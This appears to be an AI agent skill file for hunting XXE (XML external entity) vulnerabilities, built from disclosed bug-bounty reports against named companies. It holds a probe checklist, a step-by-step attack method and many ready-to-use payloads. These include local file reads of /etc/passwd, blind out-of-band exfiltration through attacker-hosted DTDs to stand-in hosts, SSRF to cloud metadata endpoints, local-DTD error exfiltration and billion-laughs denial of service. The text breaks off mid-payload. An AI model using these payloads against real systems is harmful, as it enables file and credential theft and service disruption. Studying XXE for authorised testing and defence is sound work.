---
name: hunt-xxe
description: Hunting skill for XXE / XML External Entity vulnerabilities, built from 63 assigned reports of which 54 full disclosed-report texts were read in depth (frequency table, 40 highest-signal reports with verbatim payloads, ~90 discovery clues, 60 payload exemplars). Covers Starbucks (CVSS 10.0 upload/filter-bypass XXE, H1 #500515), Twitter/X SXMP SOAP XXE (#248668), DuckDuckGo x.js blind XXE bypass (#483774, #486732), Informatica XMP-JPEG/XLSX/SAML/JSON-to-XML XXE (#836877, #105434, #106865, #106797, #105753), Semrush sitemap XXE (#312543), Elastic App Search crawler XXE (#1156748), WordPress .wav XXE on PHP 8 (#1095645), DoD SpellCheck/PeopleSoft/certrequests XXE (#715949, #710654, #2573567), Rockstar SVG emblem LFI/SSRF (#347139), Open-Xchange PPTX blind XXE (#334488), Uber ubermovement blind OOB (#154096), Evernote Apache Hive → GCP metadata SSRF (#742808), Pornhub SimpleXMLElement unserialize XXE (#142562), Coinbase SVG logo XXE (#104620), Mail.ru feed/avatar/autodiscover XXE (#505947, #276276, #277341, #315837), and Adobe/Magento CosmicSting XXE-to-RCE. Use when hunting XXE on any target — blind cases require the OOB-Or-It-Didn't-Happen gate; file-read and internal-SSRF require proof of actual data returned.
sources: github, hackerone_public, assetnote_research, splunk_security, portswigger_research
report_count: 63
full_reports_read: 54
---

## Crown Jewel Targets

XXE is a critical-severity class that consistently pays at the top of bug-bounty scales because a single parser misconfiguration yields direct local-file read, server-side request forgery, or — in rare stacks — RCE. Across the 54 full reports read, the recurring high-value targets were:

- **XML-accepting API endpoints** — the single largest signal (`xml-parser` in 51/54 full reports, `xxe` in 42/54). REST APIs that silently accept `Content-Type: application/xml` alongside JSON (Informatica marketplace #106797, DuckDuckGo `x.js?u=` #483774/#486732).
- **File-upload features that quietly parse XML** (`file-upload` 13, `image-processing` 16, `svg-upload` 5) — avatars, logos, document imports. SVG is XML (Coinbase #104620, Lab45/Topcoder #845832, Moneybird #130661, Zivver #897244); Office files are ZIP containers of XML (Informatica XLSX #105434, Open-Xchange PPTX #334488); even JPEG XMP metadata and `.wav` files carry XML that backends parse (Informatica #836877, WordPress #1095645).
- **Sitemap/RSS/Atom feed ingesters** — "fetch a URL, parse the XML" is an XXE primitive by design (Semrush Site Audit #312543, Elastic App Search crawler #1156748, Mail.ru pulse feeds #505947).
- **SAML/SSO assertion endpoints** — SAML assertions are attacker-influenced XML; SSO libraries frequently delegate parsing to XXE-enabled configurations (Informatica `POST /sso` via Okta #106865).
- **SOAP / WSDL / legacy service connectors** — PeopleSoft, JAX-WS, Apache Axis, C-CDA clinical XML (DoD #227880/#710654, Twitter SXMP #248668, QIWI soapserver #36450, drchrono #55431).
- **Document-spellcheck, conversion, and rendering pipelines** — "Spells check this XML/text", cert-enrollment, QR/meme generators with a `template` parameter (DoD SpellCheck #715949, DoD certrequests #2573567/#2564265, h1-5411 CTF #415202/#415501).
- **Cloud-hosted stacks with reachable metadata** — when the parser can reach `http://metadata.google.internal` or `169.254.169.254`, XXE becomes credential theft (Evernote/Hive → GCP metadata #742808, Informatica XMP cloud-metadata #836877).
- **Subdomains sharing one backend** — a vulnerable shared microservice is reachable across many domains; once one endpoint confirms XXE, enumerate the whole fleet (Uber #154096 vs #448598, Informatica's many subdomains, Mail.ru's many properties).

Highest payouts in this corpus: Starbucks CVSS 10.0 (#500515), Pornhub $10,000 (#142562), Mail.ru $6,000 (#505947), Mail.ru autodiscover $5,000 (#315837), Pornhub $2,500 (#72272), Open-Xchange $2,000 (#334488), GitHub Security Lab Python $1,800 (#1512937), Rockstar $1,500 (#347139), QIWI $1,000 (#36450), Mail.ru MyMail $1,000 (#277341).

**Severity rule of thumb learned from the corpus:** reflected file read (in-band) is the cleanest Critical. Blind OOB with only a DNS/HTTP ping (no data returned) is Low/Medium and must never be over-claimed — see the Gate 0 section.

---

## Attack Surface Signals

### URL / Endpoint Patterns Seen in the Reports
```
/api/rest/*/query                 # JSON body swapped to XML (Informatica #106797)
/api/*/search/GeneralSearch       # GET→POST + XML body (Uber #154096)
/api/sxmp/1.0                     # SOAP/SXMP servlet (Twitter #248668)
/ca/rest/certrequests             # cert enrollment XML (DoD #2573567)
/PSIGW/PeopleSoftServiceListeningConnector   # PeopleSoft service connector (DoD #227880/#710654)
/Kview/CustomCodeBehind/Base/Utilities/RapidSpellHelpFile.aspx  # spellcheck (DoD #715949)
/soapserver/ , /soap11 , /soap/*  # SOAP endpoints (QIWI #36450/#762251, Starbucks #762251)
/sso , /saml/acs , /sso/saml      # SAML assertion consumers (Informatica #106865)
/domain/metadata                  # metadata fetcher (Mail.ru #12583)
/autodiscover                     # Exchange autodiscover parser (Mail.ru #315837)
/wsdl , /xmlrpc , /xml/*          # generic XML service endpoints
/x.js?u=                          # URL-fetch-to-XML endpoint (DuckDuckGo #483774)
/generate.php , /api/generate.php # template/text → file read (h1-5411 CTF #415202)
/upload , /import , /convert      # file/import pipelines
/feed , /rss , /sitemap.xml       # feed/sitemap crawlers (Semrush #312543, Elastic #1156748, Mail.ru #505947)
/webdav (PROPFIND/PROPPATCH)      # WebDAV XML bodies (Mail.ru #758978)
```

### Request / Response Header Signals
```
Content-Type: application/xml          # explicit XML ingestion
Content-Type: text/xml                 # SOAP/PeopleSoft/spellcheck
Content-Type: application/soap+xml     # SOAP 1.2
Content-Type: application/xml; charset=UTF-8
Accept: application/xml                # server expects XML responses
Content-Type: multipart/form-data      # inspect file-upload parts for XML-based types
Content-Type: application/x-www-form-urlencoded; charset=UTF-8  # XXE payload still parsed (QIWI #36450, Informatica #106865)
X-Requested-With: XMLHttpRequest        # AJAX endpoint — good JSON→XML swap candidate
X-J-Token / X-Requested-With            # app-specific headers on XXE endpoints (Informatica #106802)
```

### JavaScript / Source-Recon Patterns
```
XMLSerializer, DOMParser, parseFromString
$.parseXML(
xml2js, libxmljs, fast-xml-parser, lxml, Nokogiri
new ActiveXObject("Microsoft.XMLDOM")
simplexml_load_string / SimpleXMLElement        (PHP — Pornhub #142562)
DocumentBuilderFactory, SAXParser, XMLInputFactory  (Java — most corpus cases)
xml.parsers.expat with default entity processing    (Python — Qt .ts #4094236, GitHub #1512937)
allow_file_type_list                                  (Starbucks upload allowlist #500515)
contentType parameter = image/svg+xml                 (Topcoder/Lab45 #845832)
photoUploadUrl / preSignedURL / contentType           (SVG upload flow #845832)
```

### Stack Fingerprinting (decide if XXE applies before investing)
The corpus is dominated by **Java** parsers (Semrush, Elastic, Informatica, DoD, Twitter, WordPress-on-PHP-8, Open-Xchange) whose default SAX/DOM/JAXP settings resolve entities. Fingerprint first:

| Fingerprint | Likely parser behavior |
|---|---|
| `Server: Apache Tomcat`, `X-Powered-By: Servlet`, `Java/1.8.0_144` UA in callback | Java SAX/DOM/JAXP — often vulnerable by default (Semrush #312543 callback showed `Java/1.8.0_144`; Informatica #836877 showed `User-Agent: Java...`) |
| `X-Powered-By: PHP/...`, `simplexml_load_string` reachable | PHP XML — vulnerable pre-8 with `LIBXML_NOENT` / `SimpleXMLElement` (Pornhub #142562, Magento CosmicSting) |
| `Microsoft-IIS` + `.aspx` + XML | Legacy .NET `XmlDocument`/`XmlResolver` — probe |
| Expat/Qt `.ts`, Python `xml.parsers.expat` with no `EntityDeclHandler` | Entity expansion / DoS (Qt #4094236) |
| Modern `ElementTree`/`lxml` defaults | Often hardened for file read — probe inline entity before deep work |

### Parser-Ecosystem Vulnerability Matrix

Classic `<!ENTITY xxe SYSTEM "file://...">` payloads are not universally exploitable — many mainstream ecosystems hardened their default parsers over 2018–2024. Fingerprint before investing. The corpus itself shows the split: most 2015–2021 Java/PHP cases were exploitable, while modern Python (`ElementTree`, `lxml`) defaults drop SYSTEM file content.

| Ecosystem / parser | Default behavior on SYSTEM entity | Vulnerable by default? |
|---|---|---|
| Java SAX / DOM (`DocumentBuilderFactory`, `XMLInputFactory` without disabling external entities) | Expands `SYSTEM file://` | **YES** — dominant in corpus (Semrush #312543, Elastic #1156748, Informatica) |
| Java JAXB / JAX-WS (older Spring) | Expands | **YES** (Pippo JaxbEngine #506791) |
| PHP `SimpleXMLElement` / `simplexml_load_string` | Expands | **YES** on affected versions (Pornhub #142562, Magento CosmicSting) |
| PHP `DOMDocument` with `LIBXML_NOENT` | Expands SYSTEM | **YES** |
| .NET `XmlDocument` with `XmlResolver` set | Expands | **YES** on legacy `.aspx` (DoD SpellCheck #715949) |
| .NET `XmlReader` with `DtdProcessing=Parse` + `XmlResolver` | Expands | **YES** (modern default `DtdProcessing.Prohibit` throws on DOCTYPE = safe) |
| Python `xml.etree.ElementTree` ≥ 3.7.1 | SYSTEM disabled | NO |
| Python `lxml` (6.x) | Drops SYSTEM file content; may still fetch network with `no_network=False` | NO for file read |
| Python `xml.dom.minidom`, `defusedxml.lxml` | Default safe / disabled | NO |
| Ruby Nokogiri default | Disabled | NO |
| Ruby Nokogiri with `DTDLOAD` parse option | Expands | **YES** |
| Python `xml.parsers.expat` with default entity processing | Expands internal entities (DoS) | **YES** for entity expansion (Qt #4094236) |
| Embedded IoT / industrial XML processors (firmware) | Frequently vulnerable | **YES** |
| Microsoft Office OOXML processors that re-parse user content | Vulnerable in some legacy paths | **YES** (Informatica #105434, Open-Xchange #334488) |

**Pre-Severity Gate (from the domain reference):** before investing, send an inline-entity probe (`<!ENTITY hello "world!">` then `&hello;` in a node). If `hello!` does not echo back, parser-level entity expansion is likely off and classic SYSTEM file read will fail — pivot to OOB/error-based/proxy tricks.

---

## Discovery Patterns From 54 Full Reports

### Where Researchers Start (ranked recon surfaces, with "what to look for")

1. **Passive traffic scan for XML content types** — the #1 starting point. In the corpus, `xml-parser` appears in 51/54 reports. Look for any request/response with `application/xml`, `text/xml`, SOAP envelopes, or an `Accept: application/xml`. **What to look for:** a body that begins `<?xml`, a `<soap:Envelope>`, `<urlset>`, `<Autodiscover>`, `<operation type="deliver">`, or a `<login>` wrapper (Twitter #248668, Mail.ru #315837, Informatica #105753).

2. **JSON-to-XML content-type swap on AJAX endpoints** — repeatedly productive. A JSON body is accepted through one parser; swapping `Content-Type` to `application/xml` and reshaping the body reaches a different, XML-based code path. **What to look for:** `X-Requested-With: XMLHttpRequest` plus a POST body; try the same parameters expressed as XML elements (Informatica marketplace #106797, DuckDuckGo `x.js` #483774).

3. **File-upload flows, especially avatars/logos** — `image-processing` (16) and `file-upload` (13). **What to look for:** an upload allowlist parameter you can widen (`allow_file_type_list` → add `html;` in Starbucks #500515), a `contentType` parameter you can change to `image/svg+xml` (Topcoder #845832), or a preSignedURL/PUT S3 flow that accepts arbitrary bytes. Then embed a DOCTYPE in SVG, DOCX/XLSX/PPTX parts, JPEG XMP, or `.wav` (Coinbase #104620, Informatica #105434/#836877, WordPress #1095645).

4. **"Fetch this URL and parse it" features** — sitemap crawlers, RSS/Atom readers, link preview, metadata fetchers. **What to look for:** a parameter that takes a URL and where the server downloads an XML document (Semrush `Crawl Source = Enter sitemap URL` #312543, Elastic `/sitemap.xml` #1156748, Mail.ru `pulse` feeds #505947, DuckDuckGo `u=` #483774).

5. **Public code search / source review** — `public-code-search` (6) and `js-source-review` (5). **What to look for:** open-source components, GitHub code containing `simplexml_load_string`, `DocumentBuilder`, `xml.parsers.expat`, or missing `EntityDeclHandler`/`SetParamEntityParsing` (Qt #4094236, Pippo JaxbEngine #506791, GitHub Security Lab #1339787/#1512937). The DuckDuckGo `x.js` and h1-5411 CTF cases were found by reading frontend JS / template behavior.

6. **Known-CVE / known-product endpoints** — PeopleSoft `PSIGW` connector (CVE-2017-3548 in #710654), Magento REST (CosmicSting), AEM forms (#1321070), Qt `.ts` discovery (#4094236). **What to look for:** default paths of enterprise products; version banners; match to a known XXE CVE.

7. **Blind OOB confirmation first on opaque endpoints** — when reflection is absent, researchers plant a collaborator URL in a parameter-entity DTD and wait for a callback. **What to look for:** any XML-ish endpoint where you control a value reflected into the parsed document; the classic signal is a DNS/HTTP hit with a `Java...` User-Agent (Informatica #836877, Mail.ru #276276/#277341, Uber #154096, DuckDuckGo #486732).

### Feature-Based Discovery Signals (frequency-ranked from the 54 full reports)

| Signal (report count) | Why it matters | What to probe |
|---|---|---|
| `xml-parser` (51) | Core prerequisite — an XML parser is somewhere in the request path | Any XML content type; inline-entity probe first |
| `xxe` (42) | Confirmed XXE class in nearly 4 of 5 reports | SYSTEM file read, parameter-entity OOB, error-based |
| `path-traversal-lfi` (23) | File-read and path traversal co-occur heavily — LFI is the payoff | `file:///etc/passwd`, `C:\Windows\System32\Drivers\etc\hosts`, `/proc/self/environ` |
| `server-side-rendering` (17) | SSR/render pipelines parse templates that can hold XML | Template params (`toptext`/`bottomtext`, `template=`), renderer callbacks |
| `image-processing` (16) | Image parsers read embedded XML (XMP, SVG, EXIF-adjacent) | JPEG XMP metadata, SVG avatars, `.wav` headers |
| `comment-injection` (16) | XML comments used to break/split signatures or smuggle DOCTYPE | `<!-- -->` inside tags around ENTITY keywords |
| `search-filter-sort` (15) | Search APIs accept XML bodies and reflect entity values | `queryParams`/`query` nodes, sitemap/search endpoints |
| `api-endpoint` (15) | APIs are the dominant delivery vehicle | JSON→XML swap, `/api/rest/*/query`, `/api/search/*` |
| `file-upload` (13) | Uploads are XML containers in disguise | SVG, DOCX/XLSX/PPTX, `.wav`, allowlist bypass |
| `dos-resource` (13) | Billion-laughs / entity expansion frequently co-reported | Nested entity chains in DOCTYPE (Pippo #506791, Qt #4094236, SVG #229980) |
| `blind-oob` (12) | No reflection → needs OOB confirmation | External DTD + DNS/HTTP collaborator ping |
| `cloud-metadata` (8) | Metadata endpoints reachable → credential theft | `http://metadata.google.internal/computeMetadata/v1beta1/project/project-id` (Evernote #742808) |
| `internal-network` (7) | XXE as SSRF into internal services | `http://localhost:80/pspc/services/AdminService` (DoD #710654) |
| `url-fetching` (7) | Fetch-then-parse features | Attacker-hosted sitemap/DTD URLs |
| `cookie-handling` (6) | Authenticated endpoints need session cookies | Replay with cookies (DoD SpellCheck #715949) |
| `public-code-search` (6) | Code review reveals missing hardening | Grep for parser constructors without feature flags |
| `sso-oauth` (6) | SAML assertions are XML | `POST /sso`, Okta `saml` referer (Informatica #106865) |
| `cache-layer` (6) | Caching hides repeated probes; cache-bust to confirm | Unique query token per test |
| `filter-bypass` (5) | WAF/allowlist bypasses are common | Case variation, encoding, DTD indirection (DDG #486732, QIWI #99279/#433996) |
| `js-source-review` (5) | Frontend reveals hidden XML endpoints/params | Read bundles for `parseFromString`, `u=`, XMLHttpRequest |
| `svg-upload` (5) | SVG is XML and widely accepted as an "image" | DOCTYPE in `.svg`, rename `.jpg`→`.svg` (Coinbase #104620) |

### Verbatim Discovery Clues (18 real quotes from disclosed reports)

The following are verbatim "how I found it" lines, quoted with their report IDs exactly as they appeared in the 54-report corpus:

1. `[#500515]` "Hi,guys,when i was visited the jobs of starbucks websites in China(https://ecjobs."
2. `[#55431]` "I was able to do XXE attack on your site and exposed the /etc/passwd file."
3. `[#845832]` "I observed that when uploading a user avatar picture, the first request was sent to"
4. `[#710654]` "I was able to identify XXE on the https://███████"
5. `[#154096]` "NOTE : As it was Blind XXE Test I was Successful in Ping Test for XXE."
6. `[#334488]` "During the parsing of Powerpoint files it seems that it is possible to include XXE payload which will be executed on the Open-XChange server."
7. `[#334488]` "I was able to identify which files exist on the server, and cause the server make arbitrary request to my own server, and I am pretty sure it is also possible"
8. `[#347139]` "About one year after I started messing with the emblem editor, I finally found a full SSRF and LFI."
9. `[#347139]` "I was able to extract text files from the server and HTTP responses by rendering them on my crew emblem."
10. `[#130661]` "Researcher found an XXE issue in SVG files uploaded to our software."
11. `[#1217114]` "This was my first H1 CTF and I was excited to work with several others to collaborate on the CTF and find the flag."
12. `[#1150799]` "Greetings, I found on one of your sites an XML Injection + External service Interaction (DNS/HTTP)"
13. `[#997381]` "I found an XML injection on https://www."
14. `[#4094236]` "I found an XML entity expansion (billion laughs) weakness in the Qt translation discovery backend."
15. `[#2299069]` "I found this vulnerability at https://nextcloud."
16. `[#415202]` "On the website I found two important endpoints : /generate."
17. `[#415202]` "php I started doing some \"manual fuzzing\" trying some command injection, like `;)\"';|id`, and template injections like `{{7*7}}` but nothing seemed to work."
18. `[#415202]` "Now I have to insert the XXE payload, note that it must have `toptext` or a `bottomtext` tag to output the result to the page, at first I tried a RCE payload with `expect://`."

**Reading the clues as a hunting heuristic.** The verbs researchers use cluster into four discovery mindsets that recur across the corpus:

- **"I found / was visited / observed" (#500515, #845832, #997381, #2299069)** — discovery begins with *casual observation of an ordinary feature* (an avatar uploader, an endpoint in JS, a URL parameter), not with an XML scanner. Treat every upload and URL-fetch feature as a potential XML sink.
- **"I was able to ... exposed the /etc/passwd file" (#55431, #710654, #334488)** — success is measured by *file read*, and the payload is often tried against a feature the researcher legitimately has access to (patient update, emblem editor, PowerPoint import).
- **"Blind XXE Test ... Successful in Ping Test" (#154096, #1150799)** — when nothing reflects, the pivot is immediately to *external service interaction (DNS/HTTP)*. The `[#1150799]` clue literally names "XML Injection + External service Interaction (DNS/HTTP)" — a canonical blind-XXE signature.
- **Manual fuzzing and chained bugs (#415202)** — the h1-5411 CTF solver first tried command injection (`;)'";|id`) and template injection (`{{7*7}}`), failed, then found path traversal via a `template` filename parameter, and finally had to discover that the XXE payload only reflected inside `toptext`/`bottomtext` tags. Lesson: *parameter placement matters as much as the payload*, and XXE often sits at the end of a chain after simpler bugs fail.

### Probe Checklist (15 concrete probes)

Work top-to-bottom; each is cheap and maps to a real report pattern.

1. **Inline entity expansion probe** — `&hello;` with `<!ENTITY hello "WORLD">`. If it echoes, parser expands entities (prerequisite for all classic XXE).
2. **Classic in-band file read** — `<!ENTITY xxe SYSTEM "file:///etc/passwd">` reflected in a node (Twitter #248668, Informatica #105434/#106797, DoD #2573567).
3. **Windows file read** — `file:///C:/Windows/System32/Drivers/etc/hosts` or `file:///c:\Windows\System32\Drivers\etc\hosts` (DoD SpellCheck #715949, Rockstar #347139).
4. **Error-based file read** — point ENTITY at a nonexistent path so the parser error contains file content (Informatica marketplace #106797 returned `JAXBException: /etc/passwd1 (No such file...)`).
5. **External-DTD blind ping** — `<!ENTITY % ext SYSTEM "http://COLLAB/xxe.xml"> %ext;` and poll collaborator for HTTP/DNS (DuckDuckGo #486732, ownCloud #105980, Mail.ru #276276).
6. **Two-stage parameter-entity exfil** — external DTD builds a SYSTEM URL embedding `%file;` (Uber #154096, Elastic #1156748, Informatica #105753).
7. **Content-type swap** — change `application/json` → `application/xml`, reshape body into XML (Informatica #106797).
8. **SVG upload with DOCTYPE** — embed `<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>` and a `<text>&xxe;</text>` (Coinbase #104620, Lab45 #845832).
9. **Office-part injection** — open `.xlsx`/`.pptx` as ZIP, inject DOCTYPE into `xl/worksheets/sheet1.xml` (Informatica #105434) or `ppt/tableStyles.xml`/`slide1.xml` (Open-Xchange #334488).
10. **JPEG XMP metadata injection** — place external-DTD entity in a profile-avatar JPEG's XMP block (Informatica #836877).
11. **`.wav` upload (PHP 8 WordPress)** — crafted `.wav` with external DTD at the documented offset (WordPress #1095645).
12. **Sitemap / feed URL fetch** — host a malicious `sitemap.xml` with a parameter-entity exfil chain (Semrush #312543, Elastic #1156748, Mail.ru #505947).
13. **Cloud metadata via XXE** — `<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1beta1/project/project-id">` (Evernote #742808).
14. **Internal-service SSRF via XXE** — `<!DOCTYPE a PUBLIC ... "http://localhost:80/pspc/services/AdminService?...">` (DoD #710654).
15. **Billion-laughs DoS sanity check** — nested entities to confirm the parser expands internal entities when no other vector reflects (Pippo #506791, Qt #4094236, SVG #229980).

---

## Step-by-Step Hunting Methodology

1. **Map all XML entry points.** Passive-scan the whole app for XML content types. Intercept JSON AJAX endpoints and retry as `application/xml` with equivalent XML bodies (Informatica #106797). Spider JS bundles for parsers/fetch calls (DuckDuckGo `x.js` #483774).

2. **Fingerprint the parser stack.** Note server banners and, when you get an OOB callback, the `User-Agent` — `Java/1.8.0_144` (Semrush #312543) or `Java...` (Informatica #836877) confirms a Java parser that likely resolves entities. Decide whether classic file read is plausible.

3. **Run the inline-entity gate.** Send `<!ENTITY hello "WORLD">` + `&hello;`. No echo → entity expansion disabled; pivot to OOB, error-based, or XInclude/local-DTD tricks rather than burning time.

4. **Attempt in-band file read first.** SYSTEM entity to `/etc/passwd`, `/sys/power/image_size` (Mail.ru #315837), or `C:\Windows\System32\Drivers\etc\hosts`. Check reflection in the response body or in error messages (Twitter #248668 returned `/etc/passwd` in an error; Informatica #106797 in a `JAXBException`).

5. **If no reflection, set up OOB detection.** Start Burp Collaborator / interactsh / a self-hosted listener with DNS+HTTP logging. Submit an external-DTD or SYSTEM-entity payload pointing at it. **Wait 30–120s and poll.** A hit with a Java UA confirms blind XXE (Informatica #836877, Mail.ru #276276/#277341, Uber #154096).

6. **Escalate blind XXE to data exfiltration.** Host `evil.dtd` on your server; use a parameter entity to read a local file and URL-encode it into a callback path: `<!ENTITY % data SYSTEM "file:///etc/passwd"><!ENTITY % exfil "<!ENTITY x SYSTEM 'http://YOUR/?%data;'>">` (Elastic #1156748, Uber #154096, Informatica #105753 used `ftp://` for exfil).

7. **Test SSRF pivot.** Point entities at `http://169.254.169.254/...`, `http://metadata.google.internal/...`, `http://localhost:80/pspc/services/AdminService?...` (DoD #710654), or `http://10.0.0.x/`. Look for response/timing differences and for new services created (DoD #710654 created a new service via XXE).

8. **Work every upload vector.** Try SVG avatars/logos (`image/svg+xml`, rename `.jpg` #104620/#845832), Office ZIP parts (#105434/#334488), JPEG XMP (#836877), `.wav` (#1095645). Bypass allowlists by widening `allow_file_type_list` (#500515) or changing `contentType` (#845832).

9. **Test parameter-level injection.** Inject into every element value, attribute value, and even element names; some endpoints parse only specific nodes. The h1-5411 CTF payload had to land inside `toptext`/`bottomtext` to be reflected (#415202).

10. **Enumerate subdomains / shared backends.** If one domain is vulnerable, test the whole fleet — Uber, Informatica, Mail.ru, and DuckDuckGo (`api.duckduckgo.com`) all showed the same bug reachable across sibling domains (#154096/#448598, #486732).

11. **Try known-CVE paths.** Check PeopleSoft connectors (CVE-2017-3548), Magento REST (CosmicSting), AEM forms (#1321070), WebDAV PROPFIND/PROPPATCH (#758978), Qt `.ts` discovery (#4094236).

12. **If egress is blocked, go error-based / local-DTD.** Repurpose a DTD already on disk to leak file content in a parse error — no network needed. Enumerate common paths (`/usr/share/yelp/dtd/docbookx.dtd`).

13. **If file-read is patched, test DoS.** Billion-laughs / quadratic blowup demonstrates the parser still expands entities (Pippo #506791, Qt #4094236, SVG #229980) — useful as a fallback finding.

14. **Document the full chain.** Show the exact request, the reflected file content or OOB callback with data, and which internal endpoints are reachable. Screenshot each hop.

15. **Apply Gate 0 before reporting** — prove what the attacker does NOW, what the victim loses, and 10-minute reproducibility.

---

## Payload & Detection Patterns

### Inline Entity Probe (run first)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY hello "WORLD"> ]>
<root><data>&hello;</data></root>
```
Expected if exploitable: `WORLD` appears in `&hello;`'s position.

### Classic In-Band File Read
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root><data>&xxe;</data></root>
```

### Windows File Read
```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY a SYSTEM "file:///c:\Windows\System32\Drivers\etc\hosts">]>
<r>&a;</r>
```

### Error-Based File Read (Twitter / Informatica pattern)
```xml
<!-- Twitter SXMP #248668: /etc/passwd returned inside <error message="..."> -->
POST /api/sxmp/1.0 HTTP/1.1
Content-Type: text/xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY> <!ENTITY file SYSTEM "file:///etc/passwd"> ]>
<operation type="deliver">
  <account username="abc" password="a"/>
  <deliverRequest referenceId="MYREF102020022">
    <operatorId>&file;</operatorId>
    <sourceAddress type="network">40404</sourceAddress>
    <destinationAddress type="international">123</destinationAddress>
    <text encoding="ISO-8859-1">a</text>
  </deliverRequest>
</operation>
```

### Blind OOB — External-DTD Ping (DuckDuckGo #486732, ownCloud #105980)
```xml
<?xml version="1.0" ?>
<!DOCTYPE root [ <!ENTITY % ext SYSTEM "http://attacker_host/Blind_xxe"> %ext; ]>
<r></r>
```
Delivered via a fetch parameter, e.g. `GET /x.js?u=http://attacker_host/xxe.xml`.

### Blind OOB — Single SYSTEM Entity
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE dtgmlf6 [ <!ENTITY dtgmlf6ent SYSTEM "http://122.180.248.81/"> ]>
<GeneralSearch>&dtgmlf6ent;</GeneralSearch>
```
(Uber #154096 — confirmed by an inbound HTTP request to the attacker IP.)

### Two-Stage Parameter-Entity Exfiltration (Elastic #1156748, Uber #154096)
```xml
<!-- request body / sitemap.xml -->
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE urlset [
  <!ENTITY % dtd SYSTEM "http://YOURDOMAIN.COM/exfil.dtd">
  %dtd;
]>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
  <url><loc>&test;</loc></url>
</urlset>
```
```xml
<!-- exfil.dtd hosted on attacker server -->
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % data SYSTEM "file:///etc/hostname">
<!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM 'http://YOURDOMAIN.COM/exfil?%data;'>">
%param1;
```

### FTP Exfil Variant (Informatica #105753)
```xml
<!DOCTYPE root [
  <!ENTITY % b PUBLIC "lol" "file:///etc/passwd">
  <!ENTITY % asd PUBLIC "lol" "http://mysite/xx.html">
  %asd; %rrr;
]>
<login><username>demo@informatica.com</username><password>Infa123</password></login>
```
```xml
<!-- xx.html -->
<!ENTITY % c "<!ENTITY &#37; rrr SYSTEM 'ftp://mysite/%b;'>">%c;
```

### Content-Type Swap (JSON → XML, Informatica #106797)
```bash
# Original JSON
curl -X POST https://target/api/rest/mpapi/infaMPAPISearchWebService/query \
  -H "Content-Type: application/json" \
  -d '{"params":{"source":"marketplace","rows":5,"offset":0,"queryParams":{"query":"lol","fieldList":"[\"id\",\"title\"]","sortBy":"relevance"}}}'

# Replayed as XML
curl -X POST https://target/api/rest/mpapi/infaMPAPISearchWebService/query \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8" standalone="no"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd1">]><params><offset>0</offset><queryParams><query>&xxe;</query><sortBy>relevance</sortBy><fieldList>["id","title"]</fieldList></queryParams><source>marketplace</source><rows>5</rows></params>'
```

### SVG Upload XXE (Coinbase #104620, Lab45 #845832)
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg width="512px" height="512px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="14" x="0" y="16">&xxe;</text>
</svg>
```
Upload as avatar/logo; try `contentType=image/svg+xml` and rename `.jpg`→`.svg`.

### Office OOXML Part Injection (Informatica #105434, Open-Xchange #334488)
```xml
<!-- Inject into xl/worksheets/sheet1.xml inside the .xlsx ZIP -->
<!DOCTYPE foo [ <!ELEMENT foo ANY><!ENTITY xxe PUBLIC "lol" "file:///etc/passwd"> ]>

<!-- Inject into ppt/tableStyles.xml inside the .pptx ZIP -->
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE r [<!ELEMENT r ANY><!ENTITY sp SYSTEM "https://your-address/">]><r>&sp;</r>
```

### JPEG XMP Metadata XXE (Informatica #836877)
- Inject an external-DTD payload into the XMP metadata block of a profile-avatar JPEG; the server-side image parser renders it and issues a collaborator GET with a `Java...` UA.

### Cloud Metadata / SSRF via XXE (Evernote #742808, DoD #710654)
```xml
<!-- Evernote / Apache Hive xpath_string() XXE → GCP metadata -->
select xpath_string('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1beta1/project/project-id">]><stockCheck>&xxe;</stockCheck>', '*') FROM test LIMIT 5;

<!-- DoD / PeopleSoft XXE → internal service -->
<!DOCTYPE a PUBLIC "-//B/A/EN" "http://localhost:80/pspc/services/AdminService?method=...">
```

### Error-Based Exfil via Local-DTD Repurposing (zero egress)
```xml
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; err SYSTEM &#x27;file:///nonexist/%file;&#x27;>">
    %eval; %err;'>
  %local_dtd; ]>
```
Local DTD paths vary by distro — enumerate (`yelp/docbookx.dtd` is common).

### Billion Laughs / Entity Expansion DoS (Pippo #506791, SVG #229980)
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  ...
]>
<lolz>&lol3;</lolz>
```

### Additional Corpus Payload Exemplars

**Minimal PeopleSoft DOCTYPE probe (DoD #227880):**
```http
POST /PSIGW/PeopleSoftServiceListeningConnector HTTP/1.1
Host: <target>
Content-type: text/xml

<!DOCTYPE a PUBLIC "-//B/A/EN" "HELLO_XXE"><a></a>
```

**Combined local-file + remote-entity Autodiscover payload (Mail.ru #315837):**
```xml
<?xml version="1.0" encoding="utf-8" ?>
<!DOCTYPE foo [
